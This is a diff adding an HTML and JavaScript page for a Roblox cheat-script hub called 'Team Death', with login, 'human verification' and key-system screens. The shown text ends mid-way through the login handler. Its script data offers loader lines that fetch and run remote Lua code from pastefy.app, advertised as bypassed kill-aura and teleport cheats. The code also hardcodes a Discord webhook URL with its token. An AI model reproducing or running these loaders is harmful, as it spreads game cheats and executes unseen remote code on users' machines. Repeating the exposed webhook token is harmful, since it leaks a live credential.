@@ -1,0 +1,2216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Team Death | Script Hub</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            animation: fadeIn 1s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Login/Register Screens */
+        .login-screen, .register-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 20px;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        .register-screen {
+            display: none;
+        }
+
+        /* Top Menu - Hidden initially */
+        .top-menu {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            gap: 10px;
+            display: none;
+        }
+
+        .menu-btn {
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 0, 128, 0.3);
+        }
+
+        .menu-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 204, 255, 0.4);
+        }
+
+        /* Sidebar Menu */
+        .sidebar-menu {
+            position: fixed;
+            top: 0;
+            right: -400px;
+            width: 350px;
+            height: 100vh;
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            padding: 30px;
+            border-left: 2px solid #00ccff;
+            transition: right 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            overflow-y: auto;
+            box-shadow: -10px 0 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .sidebar-menu.active {
+            right: 0;
+        }
+
+        .menu-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .menu-header h2 {
+            font-size: 1.8rem;
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .close-menu {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .close-menu:hover {
+            transform: rotate(90deg);
+        }
+
+        .menu-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-left: 3px solid transparent;
+            display: flex;
+            align-items: center;
+        }
+
+        .menu-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-left: 3px solid #00ccff;
+            transform: translateX(5px);
+        }
+
+        .menu-item.active {
+            background: rgba(255, 255, 255, 0.1);
+            border-left: 3px solid #ff0080;
+        }
+
+        .menu-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .verify-screen, .hub-screen, .secure-screen, .history-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 80px 20px 20px;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .hub-screen, .secure-screen, .history-screen {
+            display: none;
+        }
+
+        .history-screen {
+            padding-top: 100px;
+        }
+
+        .logo {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 10px rgba(255, 0, 128, 0.5); }
+            to { text-shadow: 0 0 20px rgba(0, 204, 255, 0.7); }
+        }
+
+        .login-card, .register-card, .verify-card, .secure-card {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 15px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            animation: cardPulse 3s infinite alternate;
+        }
+
+        @keyframes cardPulse {
+            0% { box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
+            100% { box-shadow: 0 10px 40px rgba(255, 0, 128, 0.2); }
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: #fff;
+            text-align: center;
+        }
+
+        h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+
+        p {
+            font-size: 1.1rem;
+            color: #aaa;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .toggle-link {
+            color: #00ccff;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 15px;
+        }
+
+        .toggle-link:hover {
+            color: #ff0080;
+        }
+
+        .verify-btn, .action-btn, .login-btn {
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px auto;
+            width: 100%;
+        }
+
+        .verify-btn:hover, .action-btn:hover, .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 0, 128, 0.3);
+        }
+
+        .verify-btn:active, .action-btn:active, .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .verify-btn.loading {
+            background: linear-gradient(45deg, #666, #888);
+            cursor: not-allowed;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-message {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .success {
+            background: rgba(0, 200, 83, 0.2);
+            color: #4caf50;
+            border: 1px solid #4caf50;
+        }
+
+        .error {
+            background: rgba(244, 67, 54, 0.2);
+            color: #f44336;
+            border: 1px solid #f44336;
+        }
+
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            color: #ffc107;
+            border: 1px solid #ffc107;
+        }
+
+        .hub-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .hub-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, #00ccff, #ff0080);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .tab {
+            padding: 12px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .tab.active {
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+        }
+
+        .tab:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .tab.active:hover {
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+        }
+
+        .script-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 25px;
+            width: 100%;
+        }
+
+        .script-card {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 12px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .script-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .script-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+        }
+
+        .script-title {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .game-name {
+            font-size: 0.9rem;
+            color: #00ccff;
+            margin-bottom: 5px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .game-name i {
+            font-size: 0.8rem;
+        }
+
+        .script-description {
+            color: #aaa;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .script-code {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+            border-left: 3px solid #00ccff;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .copy-btn {
+            background: linear-gradient(45deg, #00ccff, #0088cc);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: linear-gradient(45deg, #0088cc, #00ccff);
+        }
+
+        .copy-btn.copied {
+            background: linear-gradient(45deg, #4caf50, #2e7d32);
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #00ccff;
+            box-shadow: 0 0 0 2px rgba(0, 204, 255, 0.2);
+        }
+
+        textarea.form-control {
+            min-height: 150px;
+            resize: vertical;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .step-container {
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .step-container.active {
+            display: block;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .step.active .step-circle {
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+        }
+
+        .step-line {
+            width: 50px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.1);
+            margin-top: 18px;
+        }
+
+        .step.active ~ .step-line {
+            background: linear-gradient(45deg, #ff0080, #00ccff);
+        }
+
+        .key-display {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem;
+            text-align: center;
+            letter-spacing: 1px;
+            border: 1px solid #00ccff;
+        }
+
+        .key-generator {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .key-generator h3 {
+            margin-bottom: 20px;
+            color: #00ccff;
+        }
+
+        .timer {
+            font-size: 1.5rem;
+            color: #ff0080;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        /* History Page */
+        .history-list {
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .history-item {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .history-item:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border-color: #00ccff;
+        }
+
+        .history-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .history-script-name {
+            font-size: 1.3rem;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .history-date {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        .history-key {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            border-left: 3px solid #ff0080;
+        }
+
+        .history-youtube {
+            color: #ff0000;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .history-youtube i {
+            color: #ff0000;
+        }
+
+        .coming-soon {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 60px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            border: 2px dashed rgba(255, 255, 255, 0.1);
+        }
+
+        .coming-soon i {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: #00ccff;
+            opacity: 0.7;
+        }
+
+        .coming-soon h2 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .coming-soon p {
+            color: #aaa;
+            font-size: 1.2rem;
+        }
+
+        .footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #666;
+            font-size: 0.9rem;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        @media (max-width: 768px) {
+            .hub-header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+
+            .script-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .login-card, .register-card, .verify-card, .secure-card {
+                padding: 30px 20px;
+            }
+
+            .logo {
+                font-size: 2.2rem;
+            }
+
+            .sidebar-menu {
+                width: 100%;
+                right: -100%;
+            }
+
+            .top-menu {
+                right: 10px;
+                top: 10px;
+            }
+        }
+
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .info-box {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .info-box i {
+            color: #ffc107;
+            margin-right: 10px;
+        }
+
+        .empty-history {
+            text-align: center;
+            padding: 50px 20px;
+            color: #aaa;
+        }
+
+        .empty-history i {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Menu - Hidden until verification -->
+    <div class="top-menu" id="topMenu">
+        <button class="menu-btn" id="menuToggle">
+            <i class="fas fa-bars"></i> Menu
+        </button>
+    </div>
+
+    <!-- Sidebar Menu -->
+    <div class="sidebar-menu" id="sidebarMenu">
+        <div class="menu-header">
+            <h2>Team Death</h2>
+            <button class="close-menu" id="closeMenu">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="menu-item active" data-screen="hub">
+            <i class="fas fa-home"></i> Home
+        </div>
+        <div class="menu-item" data-screen="secure">
+            <i class="fas fa-shield-alt"></i> Script Secure
+        </div>
+        <div class="menu-item" data-screen="history">
+            <i class="fas fa-history"></i> History
+        </div>
+    </div>
+
+    <!-- Login Screen -->
+    <div class="login-screen" id="loginScreen">
+        <div class="logo floating">Team Death</div>
+        <div class="login-card">
+            <h1>Login to Continue</h1>
+            <p>Login to your account or create a new one to access the script hub.</p>
+            
+            <div class="form-group">
+                <label for="loginUsername"><i class="fas fa-user"></i> Username</label>
+                <input type="text" class="form-control" id="loginUsername" placeholder="Enter your username">
+            </div>
+            
+            <div class="form-group">
+                <label for="loginPassword"><i class="fas fa-lock"></i> Password</label>
+                <input type="password" class="form-control" id="loginPassword" placeholder="Enter your password">
+            </div>
+            
+            <button class="login-btn" id="loginBtn">
+                <span class="btn-text">Login</span>
+                <div class="loading-spinner" id="loginSpinner"></div>
+                <i class="fas fa-sign-in-alt"></i>
+            </button>
+            
+            <div class="toggle-link" id="goToRegister">
+                Don't have an account? Register here
+            </div>
+            
+            <div class="status-message" id="loginStatus"></div>
+        </div>
+        
+        <div class="footer">
+            <p>Secure login system protects your account</p>
+        </div>
+    </div>
+
+    <!-- Register Screen -->
+    <div class="register-screen" id="registerScreen">
+        <div class="logo floating">Team Death</div>
+        <div class="register-card">
+            <h1>Create Account</h1>
+            <p>Create a new account to access the script hub and secure your scripts.</p>
+            
+            <div class="form-group">
+                <label for="registerUsername"><i class="fas fa-user"></i> Username</label>
+                <input type="text" class="form-control" id="registerUsername" placeholder="Choose a username">
+            </div>
+            
+            <div class="form-group">
+                <label for="registerPassword"><i class="fas fa-lock"></i> Password</label>
+                <input type="password" class="form-control" id="registerPassword" placeholder="Choose a password">
+            </div>
+            
+            <div class="form-group">
+                <label for="confirmPassword"><i class="fas fa-lock"></i> Confirm Password</label>
+                <input type="password" class="form-control" id="confirmPassword" placeholder="Confirm your password">
+            </div>
+            
+            <button class="login-btn" id="registerBtn">
+                <span class="btn-text">Register</span>
+                <div class="loading-spinner" id="registerSpinner"></div>
+                <i class="fas fa-user-plus"></i>
+            </button>
+            
+            <div class="toggle-link" id="goToLogin">
+                Already have an account? Login here
+            </div>
+            
+            <div class="status-message" id="registerStatus"></div>
+        </div>
+        
+        <div class="footer">
+            <p>Your account information is securely stored</p>
+        </div>
+    </div>
+
+    <!-- Verification Screen -->
+    <div class="verify-screen" id="verifyScreen">
+        <div class="logo floating">Team Death</div>
+        <div class="verify-card">
+            <h1>Human Verification Required</h1>
+            <p>Complete verification to confirm you're human and access the script hub.</p>
+            
+            <button class="verify-btn" id="verifyBtn">
+                <span class="btn-text">Start Verification</span>
+                <div class="loading-spinner" id="loadingSpinner"></div>
+                <i class="fas fa-shield-alt"></i>
+            </button>
+            
+            <div class="status-message" id="statusMessage"></div>
+        </div>
+        
+        <div class="footer">
+            <p>Verification protects our community from automated abuse</p>
+        </div>
+    </div>
+
+    <!-- Script Hub Screen -->
+    <div class="hub-screen" id="hubScreen">
+        <div class="container">
+            <div class="hub-header">
+                <div class="logo">Team Death</div>
+                <div class="hub-title">Script Hub</div>
+            </div>
+            
+            <div class="tabs">
+                <div class="tab active" data-tab="free">Free Scripts</div>
+                <div class="tab" data-tab="paid">Paid Scripts</div>
+            </div>
+            
+            <div class="script-grid" id="scriptContainer">
+                <!-- Scripts will be loaded here -->
+            </div>
+            
+            <div class="footer">
+                <p>Use scripts responsibly. We are not responsible for any bans or issues caused by script usage.</p>
+                <p>© 2023 Team Death Script Hub. All scripts provided by Dev Leak.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script Secure Screen -->
+    <div class="secure-screen" id="secureScreen">
+        <div class="container">
+            <div class="hub-header">
+                <div class="logo">Team Death</div>
+                <div class="hub-title">Script Secure System</div>
+            </div>
+            
+            <div class="secure-card">
+                <h2>Add Key System to Your Script</h2>
+                <p>Protect your script with our secure key system. Follow the steps below:</p>
+                
+                <div class="step-indicator">
+                    <div class="step active" data-step="1">
+                        <div class="step-circle">1</div>
+                        <div>Paste Script</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step" data-step="2">
+                        <div class="step-circle">2</div>
+                        <div>YouTube Channel</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step" data-step="3">
+                        <div class="step-circle">3</div>
+                        <div>Generate Key System</div>
+                    </div>
+                </div>
+                
+                <!-- Step 1: Paste Script -->
+                <div class="step-container active" id="step1">
+                    <div class="form-group">
+                        <label for="scriptCode"><i class="fas fa-code"></i> Paste your Lua script code:</label>
+                        <textarea class="form-control" id="scriptCode" placeholder="Paste your Lua script here..."></textarea>
+                    </div>
+                    <button class="action-btn" id="nextStep1">
+                        Next <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+                
+                <!-- Step 2: YouTube Channel -->
+                <div class="step-container" id="step2">
+                    <div class="form-group">
+                        <label for="youtubeUrl"><i class="fab fa-youtube"></i> Enter your YouTube Channel URL:</label>
+                        <input type="url" class="form-control" id="youtubeUrl" placeholder="https://www.youtube.com/@YourChannel">
+                    </div>
+                    
+                    <div class="info-box">
+                        <i class="fas fa-info-circle"></i>
+                        <strong>Don't have a YouTube channel?</strong> Please contact the owner Dev Leak on Discord for assistance.
+                    </div>
+                    
+                    <button class="action-btn" id="nextStep2">
+                        Add Key System <i class="fas fa-key"></i>
+                    </button>
+                    <button class="action-btn" style="background: linear-gradient(45deg, #666, #888);" id="backStep2">
+                        <i class="fas fa-arrow-left"></i> Back
+                    </button>
+                </div>
+                
+                <!-- Step 3: Generate Key System -->
+                <div class="step-container" id="step3">
+                    <div class="form-group">
+                        <label><i class="fas fa-key"></i> Your Secure Script with Key System:</label>
+                        <div class="script-code" id="securedScript">
+                            <!-- Generated script will appear here -->
+                        </div>
+                    </div>
+                    
+                    <button class="action-btn" id="copySecuredScript">
+                        <i class="fas fa-copy"></i> Copy Secured Script
+                    </button>
+                    
+                    <div class="key-generator">
+                        <h3><i class="fas fa-cogs"></i> How the Key System Works:</h3>
+                        <p>When a user executes your script in Roblox:</p>
+                        <ol style="text-align: left; margin: 15px 0 15px 20px; color: #aaa;">
+                            <li>A cool animated GUI appears asking for a key</li>
+                            <li>If no key, they click "Get Key"</li>
+                            <li>Verification URL is copied to clipboard</li>
+                            <li>They go to the URL and subscribe to your YouTube channel</li>
+                            <li>After 30 seconds they get a key</li>
+                            <li>They paste the key in Roblox to unlock the script</li>
+                        </ol>
+                        
+                        <div class="key-display" id="sampleKey">
+                            Death_<span id="keyNumber">829173</span>
+                        </div>
+                        
+                        <p style="color: #ff9800; margin-top: 15px;">
+                            <i class="fas fa-clock"></i> Keys expire after 5 hours
+                        </p>
+                    </div>
+                    
+                    <button class="action-btn" style="background: linear-gradient(45deg, #666, #888);" id="backStep3">
+                        <i class="fas fa-arrow-left"></i> Back
+                    </button>
+                </div>
+                
+                <div class="status-message" id="secureStatus"></div>
+            </div>
+            
+            <div class="footer">
+                <p>This key system helps protect your script from unauthorized distribution</p>
+                <p>© 2023 Team Death Security System</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- History Screen -->
+    <div class="history-screen" id="historyScreen">
+        <div class="container">
+            <div class="hub-header">
+                <div class="logo">Team Death</div>
+                <div class="hub-title">Secure Script History</div>
+            </div>
+            
+            <div class="history-list" id="historyList">
+                <!-- History items will be loaded here -->
+                <div class="empty-history" id="emptyHistory">
+                    <i class="fas fa-history"></i>
+                    <h3>No Secure Scripts Yet</h3>
+                    <p>Go to Script Secure to add key systems to your scripts</p>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>Track all your secured scripts and their keys</p>
+                <p>© 2023 Team Death History System</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const loginScreen = document.getElementById('loginScreen');
+        const registerScreen = document.getElementById('registerScreen');
+        const verifyScreen = document.getElementById('verifyScreen');
+        const hubScreen = document.getElementById('hubScreen');
+        const secureScreen = document.getElementById('secureScreen');
+        const historyScreen = document.getElementById('historyScreen');
+        const topMenu = document.getElementById('topMenu');
+        
+        const loginBtn = document.getElementById('loginBtn');
+        const registerBtn = document.getElementById('registerBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        
+        const goToRegister = document.getElementById('goToRegister');
+        const goToLogin = document.getElementById('goToLogin');
+        
+        const loginUsername = document.getElementById('loginUsername');
+        const loginPassword = document.getElementById('loginPassword');
+        const registerUsername = document.getElementById('registerUsername');
+        const registerPassword = document.getElementById('registerPassword');
+        const confirmPassword = document.getElementById('confirmPassword');
+        
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const loginSpinner = document.getElementById('loginSpinner');
+        const registerSpinner = document.getElementById('registerSpinner');
+        
+        const statusMessage = document.getElementById('statusMessage');
+        const loginStatus = document.getElementById('loginStatus');
+        const registerStatus = document.getElementById('registerStatus');
+        const btnText = document.querySelector('.btn-text');
+        
+        const scriptContainer = document.getElementById('scriptContainer');
+        const tabs = document.querySelectorAll('.tab');
+        const menuToggle = document.getElementById('menuToggle');
+        const sidebarMenu = document.getElementById('sidebarMenu');
+        const closeMenu = document.getElementById('closeMenu');
+        const menuItems = document.querySelectorAll('.menu-item');
+
+        // Script Secure Elements
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const scriptCode = document.getElementById('scriptCode');
+        const youtubeUrl = document.getElementById('youtubeUrl');
+        const securedScript = document.getElementById('securedScript');
+        const copySecuredScript = document.getElementById('copySecuredScript');
+        const nextStep1 = document.getElementById('nextStep1');
+        const nextStep2 = document.getElementById('nextStep2');
+        const backStep2 = document.getElementById('backStep2');
+        const backStep3 = document.getElementById('backStep3');
+        const secureStatus = document.getElementById('secureStatus');
+        const keyNumber = document.getElementById('keyNumber');
+        
+        // History Elements
+        const historyList = document.getElementById('historyList');
+        const emptyHistory = document.getElementById('emptyHistory');
+
+        // Fixed Script data - REMOVED separate Darkness script
+        const scripts = {
+            free: [
+                {
+                    name: "Blueness v1",
+                    game: "UGC - Steal Points",
+                    description: "This script is made by Dev Leak. In this script you would have 3 options: Kill Aura, Range, and TP Tool. They all are bypassed so you can use them.",
+                    code: 'loadstring(game:HttpGet("https://pastefy.app/Q1yQ9oLT/raw"))()'
+                },
+                {
+                    name: "Darkness", // RENAMED from "Free UGC AFK or Play" to "Darkness"
+                    game: "UGC Obby",
+                    description: "This script is made by Dev Leak. In this script you would have two options: Anti-AFK (protects you from getting kicked) and Cycle Teleport (makes you earn points fast).",
+                    code: 'loadstring(game:HttpGet("https://pastefy.app/aWDbvMQB/raw"))()'
+                }
+            ],
+            paid: [
+                // Paid scripts will show "Coming Soon" message
+            ]
+        };
+
+        // Webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1454134413083414528/nkrR2mLuJzwSI9GduLfTbt7yNDf9_UalDzsn_r3eUZk83cXBYvvHKJuhVfEj_XH2zIeq";
+
+        // User accounts storage
+        let userAccounts = JSON.parse(localStorage.getItem('teamDeathAccounts')) || [];
+        let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;
+        let secureHistory = JSON.parse(localStorage.getItem('secureHistory')) || [];
+
+        // Check if user is already logged in
+        if (currentUser) {
+            // Skip login, go directly to verification
+            loginScreen.style.display = 'none';
+            registerScreen.style.display = 'none';
+            verifyScreen.style.display = 'flex';
+        }
+
+        // Menu Toggle
+        menuToggle.addEventListener('click', () => {
+            sidebarMenu.classList.add('active');
+        });
+
+        closeMenu.addEventListener('click', () => {
+            sidebarMenu.classList.remove('active');
+        });
+
+        // Menu Navigation
+        menuItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const screen = item.dataset.screen;
+                
+                // Update active menu item
+                menuItems.forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+                
+                // Close sidebar
+                sidebarMenu.classList.remove('active');
+                
+                // Show selected screen
+                if (screen === 'hub') {
+                    showHubScreen();
+                } else if (screen === 'secure') {
+                    showSecureScreen();
+                } else if (screen === 'history') {
+                    showHistoryScreen();
+                }
+            });
+        });
+
+        // Show Hub Screen
+        function showHubScreen() {
+            hideAllScreens();
+            hubScreen.style.display = 'flex';
+            loadScripts('free');
+        }
+
+        // Show Secure Screen
+        function showSecureScreen() {
+            hideAllScreens();
+            secureScreen.style.display = 'flex';
+            resetSecureForm();
+        }
+
+        // Show History Screen
+        function showHistoryScreen() {
+            hideAllScreens();
+            historyScreen.style.display = 'flex';
+            loadHistory();
+        }
+
+        // Hide all screens
+        function hideAllScreens() {
+            loginScreen.style.display = 'none';
+            registerScreen.style.display = 'none';
+            verifyScreen.style.display = 'none';
+            hubScreen.style.display = 'none';
+            secureScreen.style.display = 'none';
+            historyScreen.style.display = 'none';
+        }
+
+        // Login/Register Toggle
+        goToRegister.addEventListener('click', () => {
+            loginScreen.style.display = 'none';
+            registerScreen.style.display = 'flex';
+        });
+
+        goToLogin.addEventListener('click', () => {
+            registerScreen.style.display = 'none';
+            loginScreen.style.display = 'flex';
+        });
+
+        // Login Function
+        loginBtn.addEventListener('click', async () => {
+            const username = loginUsername.value.trim();
+            const password = loginPassword.value.trim();
+            
+            if (!username || !password) {
+                showStatus(loginStatus, 'Please enter both username and password', 'error');
+                return;
+            }
+            
+            // Show loading
+            loginBtn.classList.add('loading');
+            loginSpinner.style.display = 'block';
+            loginBtn.disabled = true;
+            
+            // Simulate login delay
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Check if user exists
